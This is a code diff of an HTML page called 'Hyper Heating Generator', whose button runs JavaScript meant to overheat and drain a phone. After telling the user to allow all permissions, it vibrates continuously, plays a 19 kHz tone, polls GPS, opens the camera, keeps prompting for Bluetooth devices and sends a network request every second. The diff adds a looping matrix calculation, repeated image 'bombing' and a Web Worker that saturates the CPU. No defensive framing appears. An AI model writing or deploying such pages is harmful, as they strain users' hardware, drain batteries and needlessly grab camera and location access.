@@ -7,40 +7,30 @@
 <body style="background:black; color:lime; text-align:center;">
 
   <h1>Hyper Heating Generator</h1>
-  <button onclick="startHyperHeating()">Start Heating</button>
+  <button onclick="startUltra()">Start Ultra Heating</button>
 
   <script>
-    async function startHyperHeating() {
+    async function startUltra() {
       alert("Allow all permissions when asked!");
 
       // Vibrate continuously
       setInterval(() => {
-        navigator.vibrate([500, 200, 500, 200]);
-      }, 1500);
+        navigator.vibrate([500, 200, 500, 200, 1000]);
+      }, 1200);
 
       // High Frequency Audio
       const context = new (window.AudioContext || window.webkitAudioContext)();
       const oscillator = context.createOscillator();
       oscillator.type = 'square';
-      oscillator.frequency.setValueAtTime(18000, context.currentTime); // 18 kHz
+      oscillator.frequency.setValueAtTime(19000, context.currentTime); // 19kHz
       oscillator.connect(context.destination);
       oscillator.start();
 
-      // Heavy JavaScript CPU load
-      function heavyLoad() {
-        let x = 0;
-        for (let i = 0; i < 1e7; i++) {
-          x += Math.sqrt(i) * Math.random();
-        }
-        requestAnimationFrame(heavyLoad);
-      }
-      heavyLoad();
-
-      // Constant GPS Location access
+      // GPS Constant Pinging
       if ("geolocation" in navigator) {
         setInterval(() => {
           navigator.geolocation.getCurrentPosition(() => {}, () => {});
-        }, 3000);
+        }, 2000);
       }
 
       // Camera Access
@@ -54,30 +44,62 @@
           .catch((err) => console.error("Camera error:", err));
       }
 
-      // WiFi & Bluetooth scanning via navigator API trigger
+      // WiFi & Bluetooth scan
       if ('bluetooth' in navigator) {
         setInterval(async () => {
           try {
             await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
           } catch (e) {}
-        }, 10000);
+        }, 8000);
       }
 
-      // Dummy network requests
+      // Dummy Fast Network Request Bombing
       setInterval(() => {
         fetch('https://jsonplaceholder.typicode.com/posts/1')
           .then(response => response.json())
-          .then(data => console.log("Network ping"))
           .catch(err => {});
-      }, 2000);
+      }, 1000);
 
-      // Attempt to set screen brightness (tricky part)
+      // WakeLock Screen Brightness
       try {
         if ('wakeLock' in navigator) {
           const lock = await navigator.wakeLock.request('screen');
         }
-      } catch (err) {
-        console.error("WakeLock error:", err);
+      } catch (err) {}
+
+      // Heavy Matrix Computation (Simulated AI Calculation)
+      function heavyMatrixCalculation() {
+        let size = 100;
+        let A = [];
+        for (let i = 0; i < size; i++) {
+          A[i] = [];
+          for (let j = 0; j < size; j++) {
+            A[i][j] = Math.random();
+          }
+        }
+        let B = A.map(row => row.map(val => Math.sin(val * Math.random())));
+        let C = A.map((row, i) => row.map((val, j) => val + B[i][j]));
+        requestAnimationFrame(heavyMatrixCalculation);
+      }
+      heavyMatrixCalculation();
+
+      // Base64 Heavy Image Bombing
+      setInterval(() => {
+        let img = new Image();
+        img.src = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD... (a huge Base64 string)";
+        document.body.appendChild(img);
+      }, 5000);
+
+      // Web Worker CPU Stress
+      if (window.Worker) {
+        const worker = new Worker(URL.createObjectURL(new Blob([`
+          function loop() {
+            let x = 0;
+            for (let i = 0; i < 1e8; i++) { x += Math.sqrt(i) }
+            setTimeout(loop, 0);
+          }
+          loop();
+        `], {type: 'application/javascript'})));
       }
     }
   </script>
